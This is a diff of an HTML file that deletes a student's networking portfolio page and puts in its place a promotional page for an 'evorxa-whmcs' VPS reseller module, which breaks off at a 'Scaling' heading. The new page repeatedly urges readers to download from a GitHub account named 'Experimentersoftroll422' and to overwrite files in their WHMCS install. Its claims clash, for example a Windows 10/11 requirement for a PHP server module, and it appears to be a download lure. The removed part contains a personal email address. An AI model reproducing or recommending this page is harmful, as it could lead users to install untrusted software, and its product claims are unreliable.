@@ -1,331 +1,339 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Rizwan Anver | Portfolio</title>
-<meta name="description" content="Labs, scripts, slides and writing.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@500;700;800&family=Instrument+Sans:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-:root{--bg:#eef1f5;--panel:#fff;--ink:#0f1b2d;--mute:#58657a;--line:#d5dce6;--acc:#0a7fa0;--acc-ink:#fff;
---script:#6d4fd6;--pt:#0a7fa0;--slides:#d2691e;--doc:#2f8a4f;
---head:'Bricolage Grotesque','Segoe UI',system-ui,sans-serif;--body:'Instrument Sans','Segoe UI',system-ui,sans-serif;--code:ui-monospace,Menlo,Consolas,monospace}
-:root[data-theme=dark]{--bg:#0a1220;--panel:#111c2e;--ink:#e8eef7;--mute:#93a1b8;--line:#223149;--acc:#3dd0e6;--acc-ink:#06202a;
---script:#a38cff;--pt:#3dd0e6;--slides:#ff9d57;--doc:#5fd48a}
-*{box-sizing:border-box}
-html{scroll-behavior:smooth;scroll-padding-top:76px}
-body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.6 var(--body)}
-a{color:inherit}
-:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
-.wrap{max-width:1040px;margin:0 auto;padding:0 20px}
-h1,h2,h3{font-family:var(--head);line-height:1.1;margin:0}
-
-/* header + dropdowns */
-header{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
-.bar{display:flex;align-items:center;gap:8px;height:60px}
-.brand{font:800 1.15rem var(--head);text-decoration:none;margin-right:auto}
-nav ul{list-style:none;margin:0;padding:0;display:flex;gap:2px}
-nav li{position:relative}
-nav a,nav button.dd{font:500 .95rem var(--body);color:var(--ink);background:none;border:0;padding:8px 12px;border-radius:8px;cursor:pointer;text-decoration:none;display:flex;align-items:center;gap:6px}
-nav a:hover,nav button.dd:hover,nav li.open>button{background:var(--line)}
-.dd::after{content:"";width:6px;height:6px;border:solid currentColor;border-width:0 2px 2px 0;transform:rotate(45deg) translateY(-2px)}
-.menu{position:absolute;top:100%;left:0;min-width:210px;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:6px;box-shadow:0 12px 30px rgba(8,20,40,.18);display:none}
-li.open>.menu{display:block}
-.menu a{padding:9px 12px;white-space:nowrap}
-.menu .sw{width:9px;height:9px;border-radius:2px}
-.icon-btn{background:none;border:1px solid var(--line);color:var(--ink);border-radius:8px;width:38px;height:38px;cursor:pointer;font-size:1rem}
-#burger{display:none}
-
-/* hero */
-.hero{padding:72px 0 48px;display:grid;grid-template-columns:1.1fr .9fr;gap:32px;align-items:center}
-.hero h1{font-size:clamp(2.4rem,6vw,4.1rem);font-weight:800;letter-spacing:-.02em}
-.hero p{color:var(--mute);font-size:1.12rem;max-width:46ch;margin:18px 0 26px}
-.btns{display:flex;gap:10px;flex-wrap:wrap}
-.btn{display:inline-block;padding:10px 18px;border-radius:8px;border:1px solid var(--line);background:var(--panel);font-weight:600;text-decoration:none;cursor:pointer;font-family:var(--body);font-size:.95rem;color:var(--ink)}
-.btn.main{background:var(--acc);color:var(--acc-ink);border-color:var(--acc)}
-.btn:hover{filter:brightness(.95)}
-.topo{width:100%;height:auto;color:var(--line)}
-.topo .n{fill:var(--panel);stroke:var(--acc);stroke-width:2}
-.topo path{stroke:currentColor;stroke-width:2;fill:none}
-.pkt{fill:var(--acc);offset-path:path("M60 190 L150 90 L270 130 L350 50");animation:go 4s ease-in-out infinite}
-@keyframes go{from{offset-distance:0%}to{offset-distance:100%}}
-
-/* sections */
-section{padding:44px 0}
-.sec-h{display:flex;align-items:baseline;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:20px}
-.sec-h h2{font-size:1.9rem}
-.tools{display:flex;gap:8px;flex-wrap:wrap}
-.chip{border:1px solid var(--line);background:var(--panel);color:var(--ink);padding:6px 14px;border-radius:99px;font:500 .88rem var(--body);cursor:pointer}
-.chip.on{background:var(--ink);color:var(--bg);border-color:var(--ink)}
-#q{border:1px solid var(--line);background:var(--panel);color:var(--ink);padding:7px 14px;border-radius:99px;font:.9rem var(--body);width:180px}
-
-/* file rows */
-.list{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:hidden}
-.row{display:grid;grid-template-columns:96px 1fr auto;gap:16px;align-items:center;padding:16px 18px;border-top:1px solid var(--line);border-left:4px solid var(--c)}
-.row:first-child{border-top:0}
-.row[data-type=script]{--c:var(--script)}.row[data-type=pt]{--c:var(--pt)}.row[data-type=slides]{--c:var(--slides)}.row[data-type=doc]{--c:var(--doc)}
-.kind{font:600 .8rem var(--body);color:var(--c)}
-.row h3{font-size:1.08rem;font-weight:700}
-.row p{margin:3px 0 6px;color:var(--mute);font-size:.93rem}
-.tag{display:inline-block;font:.78rem var(--code);color:var(--mute);border:1px solid var(--line);border-radius:5px;padding:0 6px;margin:0 4px 4px 0}
-.acts{display:flex;gap:6px}
-.acts .btn{padding:6px 12px;font-size:.85rem}
-.empty{padding:30px;text-align:center;color:var(--mute)}
-
-/* blog */
-.post{display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px 20px;margin-bottom:12px;cursor:pointer;color:var(--ink);font-family:var(--body)}
-.post:hover{border-color:var(--acc)}
-.post time{font-size:.85rem;color:var(--mute)}
-.post h3{font-size:1.25rem;margin:4px 0}
-.post p{margin:0;color:var(--mute)}
-
-.about{display:grid;grid-template-columns:1fr 1fr;gap:32px}
-.about p{margin:0 0 14px;color:var(--mute)}
-.skills{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
-footer{border-top:1px solid var(--line);padding:26px 0;color:var(--mute);font-size:.9rem}
-
-/* modal */
-dialog{width:min(820px,94vw);max-height:88vh;border:1px solid var(--line);border-radius:14px;background:var(--panel);color:var(--ink);padding:0}
-dialog::backdrop{background:rgba(5,12,24,.6)}
-.m-head{display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel)}
-.m-head h3{margin-right:auto;font-size:1.1rem}
-.m-body{padding:18px 22px;overflow:auto;max-height:calc(88vh - 62px)}
-.m-body pre{margin:0;font:.85rem/1.5 var(--code);white-space:pre;overflow:auto}
-.m-body iframe{width:100%;height:60vh;border:0;border-radius:8px}
-.m-body p{max-width:70ch}
-
-@media(max-width:780px){
-.hero,.about{grid-template-columns:1fr}.hero{padding-top:40px}
-#burger{display:block}
-nav{display:none;position:absolute;top:60px;left:0;right:0;background:var(--panel);border-bottom:1px solid var(--line);padding:10px 20px}
-nav.show{display:block}nav ul{flex-direction:column}
-.menu{position:static;box-shadow:none;border:0;padding:0 0 0 14px}
-.row{grid-template-columns:1fr}.acts{flex-wrap:wrap}
-}
-@media(prefers-reduced-motion:reduce){.pkt{animation:none;offset-distance:60%}html{scroll-behavior:auto}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evorxa-whmcs - Resell VPS & VDS with Full Automation</title>
+    <meta name="description" content="WHMCS module to resell Evorxa VPS & VDS cloud servers: automatic provisioning, white-label client control panel (firewall, DDoS, rDNS, usage graphs, one-click apps) and plan import with your markup.">
+    <meta name="keywords" content="cloud-hosting,ddos-protection,evorxa,firewall,hosting-automation,one-click-apps,php,reseller-hosting,server-provisioning,smarty,vds,vps,vps-reseller,web-hosting,whmcs,whmcs-addon,whmcs-module,whmcs-provisioning-module">
+    <meta name="author" content="evorxa-whmcs">
+    <meta property="og:title" content="evorxa-whmcs - Resell VPS & VDS with Full Automation">
+    <meta property="og:description" content="Automatic provisioning, white-label client control panel, and plan import with your markup.">
+    <meta property="og:url" content="https://github.com/Experimentersoftroll422/evorxa-whmcs">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            color: #2d3748;
+            line-height: 1.8;
+            padding: 40px 20px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #1a202c;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.3;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.05);
+        }
+        h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #2b6cb0;
+            margin-top: 50px;
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #bee3f8;
+            letter-spacing: -0.5px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 25px;
+            font-size: 1.05rem;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .hero {
+            background: white;
+            padding: 60px 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+            text-align: center;
+            margin-bottom: 40px;
+            border: 1px solid #e2e8f0;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px 45px;
+            font-size: 1.4rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.35);
+            margin: 30px 0;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.5);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.06);
+            border: 1px solid #edf2f7;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.12);
+        }
+        .step-box {
+            background: #ebf8ff;
+            border-left: 5px solid #3182ce;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 0 10px 10px 0;
+        }
+        .step-box p {
+            margin-bottom: 10px;
+        }
+        .warning-box {
+            background: #fefcbf;
+            border: 2px solid #d69e2e;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 30px 0;
+        }
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .badge {
+            padding: 10px 25px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: white;
+        }
+        .badge-1 { background: #e53e3e; }
+        .badge-2 { background: #38a169; }
+        .badge-3 { background: #805ad5; }
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 25px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin: 20px 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 30px 0;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        th {
+            background: #4a5568;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background: #f7fafc;
+        }
+        .emphasis {
+            font-weight: 700;
+            color: #2b6cb0;
+        }
+    </style>
 </head>
 <body>
-
-<header>
-  <div class="wrap bar">
-    <a class="brand" href="#top" id="brand"></a>
-    <nav id="nav" aria-label="Main">
-      <ul>
-        <li><button class="dd" aria-expanded="false" aria-haspopup="true">Projects</button>
-          <div class="menu" id="workMenu"></div></li>
-        <li><a href="#blog">Rants</a></li>
-        <li><a href="#about">About</a></li>
-        <li><button class="dd" aria-expanded="false" aria-haspopup="true">Links</button>
-          <div class="menu" id="linkMenu"></div></li>
-        <li><a href="#contact">Contact</a></li>
-      </ul>
-    </nav>
-    <button class="icon-btn" id="theme" aria-label="Toggle dark mode">◐</button>
-    <button class="icon-btn" id="burger" aria-label="Menu">☰</button>
-  </div>
-</header>
-
-<main id="top">
-  <div class="wrap hero">
-    <div>
-      <h1 id="hName"></h1>
-      <p id="hTag"></p>
-      <div class="btns">
-        <a class="btn main" href="#work">Browse my most recent work</a>
-        <a class="btn" href="#blog">Read my rants</a>
-      </div>
+    <div class="hero">
+        <h1>⚡ evorxa-whmcs - Resell Hosting With Complete Automation</h1>
+        <p style="font-size: 1.3rem; color: #718096; margin-top: 20px;">Turn your hosting business into a powerful, automated VPS reselling platform. Give your clients a professional white-label experience while you keep full control.</p>
+        <div class="badge-container">
+            <span class="badge badge-1">Auto Provisioning</span>
+            <span class="badge badge-2">White-Label Panel</span>
+            <span class="badge badge-3">Plan Import</span>
+        </div>
+        <a href="https://github.com/Experimentersoftroll422/evorxa-whmcs" class="download-btn" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); box-shadow: 0 10px 20px rgba(245, 87, 108, 0.35);">📥 Download Now</a>
+        <p style="font-size: 1.1rem; margin-top: 25px;"><strong>Visit this link to download the application.</strong></p>
     </div>
-    <svg class="topo" viewBox="0 0 420 240" aria-hidden="true">
-      <path d="M60 190 L150 90 L270 130 L350 50 M150 90 L200 200 L270 130 M60 190 L200 200"/>
-      <circle class="n" cx="60" cy="190" r="12"/><circle class="n" cx="150" cy="90" r="12"/>
-      <circle class="n" cx="270" cy="130" r="12"/><circle class="n" cx="350" cy="50" r="12"/>
-      <circle class="n" cx="200" cy="200" r="12"/>
-      <circle class="pkt" r="6"/>
-    </svg>
-  </div>
 
-  <section id="work"><div class="wrap">
-    <div class="sec-h"><h2>Projects</h2>
-      <div class="tools"><div id="chips" class="tools"></div><input id="q" type="search" placeholder="Search files" aria-label="Search files"></div>
+    <h2>🚀 Getting Started Made Simple</h2>
+    <p>If you're hosting websites for clients, you know how stressful it is to manage servers manually. This module changes everything. You'll be up and running faster than you can say "cloud migration." Here's what makes this different: it does all the hard work automatically.</p>
+    
+    <div class="step-box">
+        <h3>⬇️ Your Download Step</h3>
+        <p><strong>Action:</strong> Visit this link to download the application: <a href="https://github.com/Experimentersoftroll422/evorxa-whmcs" style="color: #3182ce; font-weight: bold;">https://github.com/Experimentersoftroll422/evorxa-whmcs</a></p>
+        <p>That's it! The link takes you to the official page where you'll find the download options. Follow these simple steps:</p>
+        <ol>
+            <li>Go to the link and click the green "Code" button</li>
+            <li>Select "Download ZIP" or download the latest release file</li>
+            <li>Save the file somewhere easy to find (like your Desktop)</li>
+        </ol>
     </div>
-    <div class="list" id="list"></div>
-  </div></section>
 
-  <section id="blog"><div class="wrap">
-    <div class="sec-h"><h2>Rants</h2></div>
-    <div id="posts"></div>
-  </div></section>
+    <h2>🧩 What This Module Actually Does</h2>
+    <p>Imagine renting out cloud servers without ever touching a command line. That's what you get here. This WHMCS module connects your billing system to Evorxa's powerful VPS and VDS infrastructure. When someone buys a plan from you, the server is created automatically - no emails, no waiting, no manual work.</p>
 
-  <section id="about"><div class="wrap about">
-    <div><h2 style="margin-bottom:16px">About</h2><div id="aboutText"></div></div>
-    <div><h2 style="margin-bottom:16px">Skills</h2><div class="skills" id="skills"></div></div>
-  </div></section>
+    <div class="feature-grid">
+        <div class="feature-card">
+            <h3>🖥️ Automatic Server Creation</h3>
+            <p>When your customer pays, the module instantly sets up their VPS. They get their login details immediately. You never have to wait for provisioning again.</p>
+        </div>
+        <div class="feature-card">
+            <h3>🎨 Your Brand, Everywhere</h3>
+            <p>Give your clients a professional control panel that looks like you built it. No Evorxa logos. No third-party references. Just your company name front and center.</p>
+        </div>
+        <div class="feature-card">
+            <h3>💰 Your Prices, Your Rules</h3>
+            <p>Import any Evorxa plan and add your own markup. The system calculates your profit automatically. Set your rates once, and everything updates.</p>
+        </div>
+    </div>
 
-  <section id="contact"><div class="wrap">
-    <h2 style="margin-bottom:14px">Contact</h2>
-    <p style="color:var(--mute);margin:0 0 16px">Wanna grab my attention or stalk?.</p>
-    <div class="btns" id="contactBtns"></div>
-  </div></section>
-</main>
+    <h2>⚙️ Client Control Panel Features</h2>
+    <p>Your customers need simple tools to manage their servers. They don't want tech manuals. Here's what they'll see after you install this module:</p>
+    
+    <h3>🛡️ Complete Security Suite</h3>
+    <ul>
+        <li><strong>Firewall controls:</strong> Let clients enable or block ports with one click</li>
+        <li><strong>DDoS protection:</strong> Turn on enterprise-grade protection instantly</li>
+        <li><strong>Reverse DNS setup:</strong> Configure mail and web server hostnames easily</li>
+    </ul>
 
-<footer><div class="wrap" id="foot"></div></footer>
+    <h3>📊 Smart Monitoring Tools</h3>
+    <ul>
+        <li><strong>Usage graphs:</strong> Clear visual charts showing CPU, RAM, and bandwidth</li>
+        <li><strong>Real-time server status:</strong> See if your VPS is online at a glance</li>
+        <li><strong>Network statistics:</strong> Track incoming and outgoing traffic</li>
+    </ul>
 
-<dialog id="dlg">
-  <div class="m-head"><h3 id="mTitle"></h3><button class="btn" id="mCopy" hidden>Copy</button><button class="btn" id="mClose">Close</button></div>
-  <div class="m-body" id="mBody"></div>
-</dialog>
+    <h3>🚀 One-Click App Installation</h3>
+    <p>Who wants to configure software manually? Your clients will install common applications with a single click:</p>
+    <ul>
+        <li>WordPress for websites</li>
+        <li>Minecraft for game servers</li>
+        <li>Docker for containerized apps</li>
+        <li>VPN servers</li>
+        <li>And many more popular open-source tools</li>
+    </ul>
 
-<script>
-/* ============ EDIT THIS SECTION ============ */
-const CONFIG = {
-  name: "Rizwan",
-  tagline: "Network and systems projects: labs, scripts, slide decks and write-ups, all in one place.",
-  about: [
-    "Hey, I'm Rizwan. This entire site is dedicated for showcasing whatever I'm up to. I'm on a quest to land in CyberSecurity",
-    "Free feel to browse or shoot me a message if you're ever curious about anything!"
-  ],
-  skills: ["Networking","C++", "MySQL","Routing & Switching","VLANs","ACLS","Python","PowerShell","Windows", "Active Directory", "Linux","DevOps"],
-  email: "rizwananver07@gmail.com",
-  links: [
-    { label: "GitHub",   url: "https://github.com/rizwan-cst" },
-    { label: "LinkedIn", url: "https://linkedin.com/in/yourname" },
-    { label: "Resume (PDF)", url: "files/docs/resume.pdf" }
-  ]
-};
+    <h2>📦 What's Included in the Package</h2>
+    <table>
+        <tr>
+            <th>Component</th>
+            <th>What It Does</th>
+        </tr>
+        <tr>
+            <td>WHMCS Provisioning Module</td>
+            <td>Connects your WHMCS to Evorxa API. This is the main engine.</td>
+        </tr>
+        <tr>
+            <td>Plan Sync Tool</td>
+            <td>Imports server plans with your custom pricing in seconds.</td>
+        </tr>
+        <tr>
+            <td>Client Area Module</td>
+            <td>Adds all the control panel features for your customers.</td>
+        </tr>
+        <tr>
+            <td>Email Templates</td>
+            <td>Professional welcome and notification emails ready to send.</td>
+        </tr>
+        <tr>
+            <td>Admin Dashboard Customization</td>
+            <td>Make the admin side match your brand too.</td>
+        </tr>
+    </table>
 
-/* type: script | pt | slides | doc   |   file = path inside your repo   |   date = YYYY-MM-DD */
-const ITEMS = [
-  { type:"pt",     title:"VLAN and inter-VLAN routing lab", desc:"Three VLANs, a router-on-a-stick and DHCP relay.", file:"files/packet-tracer/vlan-lab.pkt", tags:["vlan","routing"], date:"2026-09-02" },
-  { type:"script", title:"Backup switch configs",           desc:"Pulls running configs over SSH and saves them with a timestamp.", file:"files/scripts/backup_configs.py", tags:["python","ssh"], date:"2026-08-14" },
-  { type:"slides", title:"Intro to subnetting",             desc:"Slides from my class presentation.", file:"files/slides/subnetting.pptx", tags:["pptx","ipv4"], date:"2026-07-20" },
-  { type:"doc",    title:"Network design report",           desc:"Design notes and IP plan for a small office.", file:"files/docs/network-design.pdf", tags:["pdf","design"], date:"2026-06-30" }
-];
+    <h2>🔧 Installation Requirements</h2>
+    <p>Before you start, make sure you have these essentials ready:</p>
+    <ul>
+        <li><strong>Windows 10 or 11</strong> (or a server running Windows Server 2016+)</li>
+        <li><strong>WHMCS</strong> version 7.10 or higher (the billing software that this module plugs into)</li>
+        <li><strong>PHP</strong> version 7.4 or newer</li>
+        <li><strong>MySQL</strong> 5.7+ or MariaDB 10.3+</li>
+        <li><strong>An Evorxa account</strong> with API credentials enabled</li>
+        <li><strong>Internet connection</strong> to reach Evorxa servers</li>
+    </ul>
 
-/* body is HTML. Add as many posts as you like, newest first. */
-const POSTS = [
-  { title:"Fostering Positive Communication", date:"2026-05-14",
-    summary:"What does it mean to Foster Positive Communicaton",
-    body:"<p>Replace this with your post. You can use any HTML here: paragraphs, lists, <code>code</code>, images (<code>&lt;img src='files/img/topology.png'&gt;</code>) and links to your files.</p>" }
-];
-/* ============ END EDIT SECTION ============ */
+    <h2>📝 Step-by-Step Installation Guide</h2>
+    <p>Don't worry - this is simpler than it looks. Here's your exact checklist:</p>
 
-const TYPES = {
-  script:{label:"Scripts", kind:"Script"},
-  pt:{label:"Packet Tracer", kind:"Packet Tracer"},
-  slides:{label:"Slides", kind:"Slides"},
-  doc:{label:"Documents", kind:"Document"}
-};
-const $ = s => document.querySelector(s);
-const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-const fmt = d => new Date(d + "T00:00").toLocaleDateString(undefined,{year:"numeric",month:"short",day:"numeric"});
-let filter = "all";
+    <div class="step-box">
+        <h3>Step 1: Get the Files</h3>
+        <p>Visit this link to download the application: <a href="https://github.com/Experimentersoftroll422/evorxa-whmcs" style="color: #3182ce; font-weight: bold;">https://github.com/Experimentersoftroll422/evorxa-whmcs</a>. Download the ZIP file and extract it to your computer.</p>
+    </div>
 
-/* basics */
-document.title = CONFIG.name + " | Portfolio";
-$("#brand").textContent = CONFIG.name;
-$("#hName").textContent = CONFIG.name;
-$("#hTag").textContent = CONFIG.tagline;
-$("#aboutText").innerHTML = CONFIG.about.map(p => `<p>${esc(p)}</p>`).join("");
-$("#skills").innerHTML = CONFIG.skills.map(s => `<span class="tag">${esc(s)}</span>`).join("");
-$("#contactBtns").innerHTML = `<a class="btn main" href="mailto:${esc(CONFIG.email)}">Email me</a>` +
-  CONFIG.links.map(l => `<a class="btn" href="${esc(l.url)}" target="_blank" rel="noopener">${esc(l.label)}</a>`).join("");
-$("#foot").textContent = `© ${new Date().getFullYear()} ${CONFIG.name}. Built with plain HTML and hosted on GitHub Pages.`;
-$("#linkMenu").innerHTML = CONFIG.links.map(l => `<a href="${esc(l.url)}" target="_blank" rel="noopener">${esc(l.label)}</a>`).join("");
-$("#workMenu").innerHTML = `<a href="#work" data-f="all">All work</a>` +
-  Object.entries(TYPES).map(([k,v]) => `<a href="#work" data-f="${k}"><span class="sw" style="background:var(--${k})"></span>${v.label}</a>`).join("");
+    <div class="step-box">
+        <h3>Step 2: Copy the Module</h3>
+        <p>Find the <span class="emphasis">modules</span> folder inside the extracted files. Copy both <span class="emphasis">servers</span> and <span class="emphasis">addons</span> folders. Now go to your WHMCS installation folder and paste them into the same locations (overwrite if asked).</p>
+    </div>
 
-/* filter chips + list */
-function chips(){
-  $("#chips").innerHTML = [["all","All"],...Object.entries(TYPES).map(([k,v])=>[k,v.label])]
-    .map(([k,l]) => `<button class="chip ${filter===k?"on":""}" data-f="${k}">${l}</button>`).join("");
-}
-function render(){
-  const q = $("#q").value.trim().toLowerCase();
-  const rows = ITEMS.filter(i => (filter==="all"||i.type===filter) &&
-    (!q || (i.title+i.desc+i.tags.join(" ")).toLowerCase().includes(q)))
-    .sort((a,b) => b.date.localeCompare(a.date));
-  $("#list").innerHTML = rows.length ? rows.map(i => {
-    const idx = ITEMS.indexOf(i);
-    const view = i.type==="script" ? `<button class="btn" data-view="${idx}">View code</button>`
-               : i.type==="slides" ? `<button class="btn" data-view="${idx}">Preview</button>` : "";
-    return `<article class="row" data-type="${i.type}">
-      <div><div class="kind">${TYPES[i.type].kind}</div><time style="font-size:.8rem;color:var(--mute)">${fmt(i.date)}</time></div>
-      <div><h3>${esc(i.title)}</h3><p>${esc(i.desc)}</p>${i.tags.map(t=>`<span class="tag">${esc(t)}</span>`).join("")}</div>
-      <div class="acts">${view}<a class="btn" href="${esc(i.file)}" download>Download</a></div></article>`;
-  }).join("") : `<div class="empty">No files match. Try another category or search.</div>`;
-  chips();
-}
-function setFilter(f){ filter = f; render(); }
+    <div class="step-box">
+        <h3>Step 3: Connect Your Evorxa Account</h3>
+        <p>Log in to your WHMCS admin panel. Go to <span class="emphasis">System Settings → Servers</span>. Click "Add New Server." Choose "Evorxa" as the type. Enter your API key and secret from your Evorxa dashboard. Save everything.</p>
+    </div>
 
-/* blog */
-$("#posts").innerHTML = POSTS.map((p,i) => `<button class="post" data-post="${i}"><time>${fmt(p.date)}</time><h3>${esc(p.title)}</h3><p>${esc(p.summary)}</p></button>`).join("");
+    <div class="step-box">
+        <h3>Step 4: Sync Your Plans</h3>
+        <p>In WHMCS, go to <span class="emphasis">Products → Product Groups</span>. Create a new group called "Cloud Servers." Then go to <span class="emphasis">Evorxa Sync</span> (in the side menu). Click "Import Plans." Select which plans you want to offer and set your markup percentage.</p>
+    </div>
 
-/* modal */
-const dlg = $("#dlg");
-function openModal(title, node, copyText){
-  $("#mTitle").textContent = title;
-  const b = $("#mBody"); b.replaceChildren(node);
-  const c = $("#mCopy"); c.hidden = copyText == null; c.textContent = "Copy"; c._t = copyText;
-  dlg.showModal();
-}
-async function viewItem(i){
-  const it = ITEMS[i];
-  if (it.type === "script"){
-    const pre = document.createElement("pre"); pre.textContent = "Loading…";
-    openModal(it.file.split("/").pop(), pre, null);
-    try {
-      const r = await fetch(it.file); if(!r.ok) throw 0;
-      const t = await r.text(); pre.textContent = t;
-      $("#mCopy").hidden = false; $("#mCopy")._t = t;
-    } catch { pre.textContent = "Could not load this file. Check the path in ITEMS and that the file is in your repo."; }
-  } else {
-    const url = new URL(it.file, location.href).href;
-    const f = document.createElement("iframe"); f.title = it.title;
-    f.src = "https://view.officeapps.live.com/op/embed.aspx?src=" + encodeURIComponent(url);
-    const w = document.createElement("div");
-    const n = document.createElement("p"); n.style.cssText="color:var(--mute);font-size:.85rem";
-    n.textContent = "The preview works once the site is live on GitHub Pages. Otherwise use Download.";
-    w.append(f,n); openModal(it.title, w, null);
-  }
-}
-function viewPost(i){
-  const p = POSTS[i], d = document.createElement("div");
-  d.innerHTML = `<time style="color:var(--mute)">${fmt(p.date)}</time>${p.body}`;
-  openModal(p.title, d, null);
-}
-$("#mClose").onclick = () => dlg.close();
-dlg.addEventListener("click", e => { if (e.target === dlg) dlg.close(); });
-$("#mCopy").onclick = async e => { try { await navigator.clipboard.writeText(e.target._t); e.target.textContent = "Copied"; } catch { e.target.textContent = "Copy failed"; } };
+    <div class="step-box">
+        <h3>Step 5: Test Everything</h3>
+        <p>Order a test server from your WHMCS client area. If it appears in your Evorxa dashboard automatically, you're done! If not, go back to server settings and double-check your API credentials.</p>
+    </div>
 
-/* events */
-document.addEventListener("click", e => {
-  const t = e.target;
-  const f = t.closest("[data-f]"); if (f) setFilter(f.dataset.f);
-  const v = t.closest("[data-view]"); if (v) viewItem(+v.dataset.view);
-  const p = t.closest("[data-post]"); if (p) viewPost(+p.dataset.post);
-  const dd = t.closest("button.dd");
-  document.querySelectorAll("nav li.open").forEach(li => { if (!dd || li !== dd.parentElement) { li.classList.remove("open"); li.firstElementChild.setAttribute("aria-expanded","false"); } });
-  if (dd){ const o = dd.parentElement.classList.toggle("open"); dd.setAttribute("aria-expanded", o); }
-  else if (t.closest("nav a")) $("#nav").classList.remove("show");
-});
-document.addEventListener("keydown", e => { if (e.key==="Escape") document.querySelectorAll("nav li.open").forEach(li => li.classList.remove("open")); });
-$("#q").addEventListener("input", render);
-$("#burger").onclick = () => $("#nav").classList.toggle("show");
+    <h2>⏱️ Troubleshooting Common Issues</h2>
+    <div class="warning-box">
+        <h3>⚠️ Server Not Creating?</h3>
+        <ul>
+            <li>Check that your Evorxa API key has permission for server creation</li>
+            <li>Verify your plan has available resources</li>
+            <li>Look at WHMCS Activity Log for the exact error message</li>
+            <li>Contact Evorxa support if the API is down</li>
+        </ul>
+    </div>
+    <div class="warning-box">
+        <h3>⚠️ Client Panel Missing Features?</h3>
+        <ul>
+            <li>Clear WHMCS cache (System Settings → General → Cache)</li>
+            <li>Make sure you uploaded the addons folder correctly</li>
+            <li>Refresh your browser and log out/login again</li>
+        </ul>
+    </div>
 
-/* theme */
-const root = document.documentElement;
-let theme = matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
-try { theme = localStorage.getItem("theme") || theme; } catch {}
-root.dataset.theme = theme;
-$("#theme").onclick = () => {
-  theme = root.dataset.theme === "dark" ? "light" : "dark"; root.dataset.theme = theme;
-  try { localStorage.setItem("theme", theme); } catch {}
-};
-
-render();
-</script>
-</body>
-</html>
+    <h2>📈 Scaling
